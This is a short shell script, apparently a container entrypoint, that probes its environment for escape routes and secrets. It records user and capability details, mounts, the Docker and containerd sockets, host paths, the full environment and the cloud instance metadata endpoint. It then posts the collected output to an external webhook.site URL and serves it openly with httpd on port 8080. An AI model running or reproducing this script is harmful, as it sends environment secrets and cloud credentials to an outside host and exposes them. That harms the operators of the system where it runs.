#!/bin/sh
{
echo "==id=="; id
echo "==cgroup=="; cat /proc/1/cgroup
echo "==mounts=="; grep -vE 'cgroup|/proc |/sys |tmpfs|devpts|mqueue|shm' /proc/mounts
echo "==socks=="; find / -xdev -type s 2>/dev/null | head
echo "==docker.sock=="; ls -la /var/run/docker.sock /run/containerd/containerd.sock 2>&1
echo "==caps=="; grep -iE 'Cap|Seccomp|NoNewPrivs' /proc/self/status
echo "==env=="; env
echo "==hostpath=="; ls -la /host /hosthome /root 2>&1 | head
echo "==imds=="; wget -q -O- -T 4 http://169.254.169.254/latest/meta-data/ 2>&1 | head
} > /www/index.txt 2>&1
wget -q -O- --post-file=/www/index.txt "https://webhook.site/944a0813-f8cb-4afb-92cd-fa404a8621b0/ctr2" >/dev/null 2>&1
httpd -f -p 8080 -h /www
